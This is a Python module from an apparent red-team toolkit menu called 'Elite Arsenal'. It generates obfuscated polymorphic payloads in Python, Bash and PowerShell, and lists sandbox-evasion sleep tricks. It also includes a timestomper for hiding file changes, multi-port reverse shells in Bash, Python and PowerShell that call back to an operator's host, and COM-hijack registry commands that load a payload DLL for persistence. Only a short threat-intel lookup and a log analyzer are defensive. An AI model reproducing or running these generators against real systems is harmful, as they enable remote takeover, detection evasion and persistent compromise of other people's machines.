"""Elite Features — Polymorphic engine, sleep obfuscation, timestomper,
multi-channel callback, COM hijacker.

Advanced evasion and persistence techniques for authorized red team operations.
"""

import sys, os, random, string, base64, time, struct

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel)
from executor import run_command, run_with_preview

# ═══════════════════════════════════════════════════════════════════════════════
# Polymorphic Payload Engine
# ═══════════════════════════════════════════════════════════════════════════════

def _random_var():
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))


def _polymorphic_python(cmd):
    """Generate polymorphic Python payload."""
    var1, var2, var3 = _random_var(), _random_var(), _random_var()
    encoded = base64.b64encode(cmd.encode()).decode()

    variants = [
        # XOR variant
        f"""import os as {var1}
{var2} = bytearray(b'{base64.b64encode(bytes([b ^ 0x42 for b in cmd.encode()])).decode()}')
{var3} = bytes([b ^ 0x42 for b in __import__('base64').b64decode({var2})])
{var1}.system({var3}.decode())""",
        # Base64 with junk
        f"""{var1} = '{encoded}'
{var2} = __import__('base64').b64decode({var1}).decode()
# {''.join(random.choices(string.ascii_letters, k=30))}
__import__('os').system({var2})""",
        # Reversed
        f"""{var1} = '{encoded[::-1]}'
{var2} = __import__('base64').b64decode({var1}[::-1])
__import__('subprocess').call({var2}.decode(), shell=True)""",
    ]
    return random.choice(variants)


def _polymorphic_bash(cmd):
    """Generate polymorphic Bash payload."""
    encoded = base64.b64encode(cmd.encode()).decode()
    var = _random_var()

    variants = [
        f'{var}=$(echo {encoded} | base64 -d); eval ${var}',
        f'eval "$(echo {encoded} | base64 -d)"',
        f'printf "%s" "{encoded}" | base64 -d | bash',
        f'echo {encoded} | base64 -d | sh',
        f'{var}=$(echo {encoded} | base64 -d); bash -c "${var}"',
    ]
    return random.choice(variants)


def _polymorphic_powershell(cmd):
    """Generate polymorphic PowerShell payload."""
    # UTF-16LE encoded command
    encoded = base64.b64encode(cmd.encode('utf-16-le')).decode()
    var = _random_var()

    variants = [
        f'powershell -enc {encoded}',
        f'${var}=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("{encoded}"));IEX ${var}',
        f'powershell -nop -w hidden -enc {encoded}',
        f'${var} = "{encoded}"; powershell -EncodedCommand ${var}',
    ]
    return random.choice(variants)


def _polymorphic_engine():
    console.print("\n[bold cyan]Polymorphic Payload Engine[/bold cyan]\n")
    warning("For authorized red team operations only!")
    
    cmd = ask("Command to make polymorphic")
    count = int(ask("Number of variants", default="5"))
    lang = show_menu([("1", "Python"), ("2", "Bash"), ("3", "PowerShell"), ("0", "Back")])
    
    if lang == "0":
        return
    
    generators = {"1": _polymorphic_python, "2": _polymorphic_bash, "3": _polymorphic_powershell}
    gen = generators[lang]
    
    console.print(f"\n[bold green]Generated {count} polymorphic variants:[/bold green]\n")
    for i in range(count):
        variant = gen(cmd)
        console.print(f"[bold yellow]Variant {i+1}:[/bold yellow]")
        console.print(f"[white]{variant}[/white]\n")


# ═══════════════════════════════════════════════════════════════════════════════
# Sleep Obfuscation Generator
# ═══════════════════════════════════════════════════════════════════════════════

def _sleep_obfuscation():
    console.print("\n[bold cyan]Sleep Obfuscation Techniques[/bold cyan]\n")
    console.print("[bold]These techniques help evade sandbox/detection by varying sleep patterns:[/bold]\n")
    
    techniques = {
        "Jitter Sleep (Bash)": 'sleep $((RANDOM % 10 + 5))',
        "Jitter Sleep (Python)": 'import time, random; time.sleep(random.uniform(5, 30))',
        "CPU Burn (evasion)": 'for i in range(10000000): pass  # Burns CPU instead of sleeping',
        "Network Wait": 'import socket; s=socket.socket(); s.settimeout(30); s.connect(("8.8.8.8", 53))',
        "Timer-based (C#)": 'Thread.Sleep(new Random().Next(5000, 30000));',
        "PowerShell Jitter": 'Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 30)',
        "Staged Delay": """
import time, random
stages = [random.uniform(1,5) for _ in range(5)]
for s in stages: time.sleep(s)  # Multiple short sleeps""",
    }
    
    for name, code in techniques.items():
        console.print(f"  [bold yellow]{name}:[/bold yellow]")
        console.print(f"    [white]{code}[/white]\n")


# ═══════════════════════════════════════════════════════════════════════════════
# Timestomper Pro
# ═══════════════════════════════════════════════════════════════════════════════

def _timestomper():
    console.print("\n[bold cyan]Timestomper Pro[/bold cyan]\n")
    
    options = [
        ("1", "Copy timestamps from another file"),
        ("2", "Set specific timestamp"),
        ("3", "Randomize timestamps (blend in)"),
        ("4", "Show file timestamps"),
        ("0", "Back"),
    ]
    choice = show_menu(options)
    
    if choice == "0":
        return
    elif choice == "1":
        source = ask("Source file (copy timestamps FROM)")
        target = ask("Target file (apply timestamps TO)")
        run_command(f"touch -r '{source}' '{target}'", timeout=5)
        success(f"Timestamps copied from {source} → {target}")
    elif choice == "2":
        filepath = ask("File path")
        timestamp = ask("Timestamp (YYYY-MM-DD HH:MM:SS)", default="2024-01-15 10:30:00")
        ts = timestamp.replace(" ", "").replace("-", "").replace(":", "")[:12]
        run_command(f"touch -t {ts} '{filepath}'", timeout=5)
        success(f"Timestamp set: {timestamp}")
    elif choice == "3":
        filepath = ask("File path")
        # Get timestamps of nearby files
        directory = os.path.dirname(filepath) or "."
        run_command(f"touch -r \"$(ls -t '{directory}' | head -2 | tail -1)\" '{filepath}'", timeout=5)
        success("Timestamp randomized to match nearby files")
    elif choice == "4":
        filepath = ask("File path")
        run_command(f"stat '{filepath}'", timeout=5)


# ═══════════════════════════════════════════════════════════════════════════════
# Multi-Channel Callback Generator
# ═══════════════════════════════════════════════════════════════════════════════

def _callback_gen():
    console.print("\n[bold cyan]Multi-Channel Callback Generator[/bold cyan]\n")
    lhost = ask("Your IP (LHOST)")
    lport = ask("Primary port (LPORT)", default="4444")
    alt_port = ask("Fallback port", default="8443")
    
    console.print(f"\n[bold green]Multi-Channel Callback (with failover):[/bold green]\n")
    
    callbacks = {
        "Bash (multi-channel)": f"""bash -c '
for port in {lport} {alt_port} 443 80; do
  bash -i >& /dev/tcp/{lhost}/$port 0>&1 && break
  sleep 2
done'""",
        "Python (multi-channel)": f"""python3 -c '
import socket,subprocess,os
for port in [{lport},{alt_port},443,80]:
    try:
        s=socket.socket();s.connect(("{lhost}",port))
        os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
        subprocess.call(["/bin/sh","-i"]);break
    except: pass'""",
        "PowerShell (multi-channel)": f"""powershell -nop -c "
@({lport},{alt_port},443,80) | ForEach-Object {{
    try {{
        $c=New-Object Net.Sockets.TCPClient('{lhost}',$_)
        $s=$c.GetStream()
        [byte[]]$b=0..65535|%{{0}}
        while(($i=$s.Read($b,0,$b.Length))-ne 0){{
            $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)
            $r=(iex $d 2>&1|Out-String)
            $s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)
        }}
        break
    }} catch {{}}
}}"
""",
    }
    
    for name, payload in callbacks.items():
        console.print(f"  [bold yellow]{name}:[/bold yellow]")
        console.print(f"  [white]{payload}[/white]\n")


# ═══════════════════════════════════════════════════════════════════════════════
# COM Object Hijacker (Windows)
# ═══════════════════════════════════════════════════════════════════════════════

def _com_hijacker():
    console.print("\n[bold cyan]COM Object Hijacker (Windows)[/bold cyan]\n")
    console.print("[bold]Common COM objects that can be hijacked for persistence:[/bold]\n")
    
    com_objects = {
        "HKCU\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}": {
            "name": "CAccPropServicesClass",
            "trigger": "Explorer startup",
            "reg_cmd": 'reg add "HKCU\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32" /v "" /d "C:\\payload.dll" /f',
        },
        "HKCU\\Software\\Classes\\CLSID\\{BCDE0395-E52F-467C-8E3D-C4579291692E}": {
            "name": "MMDeviceEnumerator",
            "trigger": "Audio application startup",
            "reg_cmd": 'reg add "HKCU\\Software\\Classes\\CLSID\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\InprocServer32" /v "" /d "C:\\payload.dll" /f',
        },
    }
    
    for clsid, data in com_objects.items():
        console.print(f"  [bold yellow]{data['name']}[/bold yellow]")
        console.print(f"    CLSID: {clsid}")
        console.print(f"    Trigger: {data['trigger']}")
        console.print(f"    [white]{data['reg_cmd']}[/white]\n")
    
    console.print("[bold]Detection:[/bold]")
    console.print("  autoruns.exe — Shows COM hijacking entries")
    console.print("  reg query HKCU\\Software\\Classes\\CLSID /s | findstr InprocServer32")


# ═══════════════════════════════════════════════════════════════════════════════
# Threat Intelligence Feed
# ═══════════════════════════════════════════════════════════════════════════════

def _threat_intel(session):
    console.print("\n[bold cyan]Threat Intelligence Lookup[/bold cyan]\n")
    ioc = ask("IOC to check (IP, domain, hash)")
    
    console.print(f"\n[bold]Checking {ioc} across threat feeds...[/bold]\n")
    
    # Use public APIs that don't require keys
    checks = [
        ("AbuseIPDB", f"curl -s 'https://api.abuseipdb.com/api/v2/check?ipAddress={ioc}' -G 2>/dev/null | python3 -m json.tool 2>/dev/null || echo 'Requires API key'"),
        ("VirusTotal", f"echo 'Check manually: https://www.virustotal.com/gui/search/{ioc}'"),
        ("Shodan", f"shodan host {ioc} 2>/dev/null || echo 'shodan not configured'"),
        ("DNS Check", f"dig {ioc} +short 2>/dev/null"),
        ("Reverse DNS", f"dig -x {ioc} +short 2>/dev/null"),
        ("Whois", f"whois {ioc} 2>/dev/null | head -20"),
    ]
    
    for name, cmd in checks:
        info(f"  {name}...")
        run_command(cmd, timeout=15)


# ═══════════════════════════════════════════════════════════════════════════════
# Log Analyzer (AI)
# ═══════════════════════════════════════════════════════════════════════════════

def _log_analyzer(session):
    console.print("\n[bold cyan]AI Log Analyzer[/bold cyan]\n")
    
    options = [
        ("1", "Analyze auth.log / system.log"),
        ("2", "Analyze web access logs"),
        ("3", "Analyze custom log file"),
        ("4", "Quick brute force detection"),
        ("0", "Back"),
    ]
    choice = show_menu(options)
    
    if choice == "0":
        return
    elif choice == "1":
        log_path = "/var/log/auth.log"
        if not os.path.exists(log_path):
            log_path = "/var/log/system.log"
        run_command(f"sudo tail -100 '{log_path}' | grep -iE '(fail|error|denied|invalid)' | tail -20", timeout=10)
    elif choice == "2":
        log_path = ask("Web log path", default="/var/log/apache2/access.log")
        run_command(f"awk '{{print $1}}' '{log_path}' 2>/dev/null | sort | uniq -c | sort -rn | head -20", timeout=10)
    elif choice == "3":
        log_path = ask("Log file path")
        run_command(f"tail -50 '{log_path}' | grep -iE '(error|fail|denied|attack|exploit|inject)' | head -20", timeout=10)
    elif choice == "4":
        log_path = ask("Auth log path", default="/var/log/auth.log")
        console.print("\n[bold]Brute Force Detection:[/bold]\n")
        run_command(f"grep 'Failed password' '{log_path}' 2>/dev/null | awk '{{print $11}}' | sort | uniq -c | sort -rn | head -10 || echo 'No auth log / no failures found'", timeout=10)


# ═══════════════════════════════════════════════════════════════════════════════
# Main Menu
# ═══════════════════════════════════════════════════════════════════════════════

def run(session):
    show_stage_header("Elite Arsenal",
                      "Advanced evasion, persistence, threat intel, and red team tools")
    
    while True:
        options = [
            ("", "[bold white]── EVASION ──[/bold white]"),
            ("1", "[bold]Polymorphic Engine[/bold] — Generate mutation-based payloads"),
            ("2", "[bold]Sleep Obfuscation[/bold] — Sandbox evasion techniques"),
            ("3", "[bold]Timestomper Pro[/bold] — File timestamp manipulation"),
            ("", "[bold white]── CALLBACK ──[/bold white]"),
            ("4", "[bold]Multi-Channel Callback[/bold] — Failover reverse shells"),
            ("5", "[bold]COM Hijacker[/bold] — Windows COM persistence"),
            ("", "[bold white]── INTEL ──[/bold white]"),
            ("6", "[bold]Threat Intelligence[/bold] — IOC lookup & reputation"),
            ("7", "[bold]AI Log Analyzer[/bold] — Detect breaches in logs"),
            ("0", "Back to Main Menu"),
        ]
        choice = show_menu(options)
        
        if choice == "0": return
        elif choice == "1": _polymorphic_engine()
        elif choice == "2": _sleep_obfuscation()
        elif choice == "3": _timestomper()
        elif choice == "4": _callback_gen()
        elif choice == "5": _com_hijacker()
        elif choice == "6": _threat_intel(session)
        elif choice == "7": _log_analyzer(session)
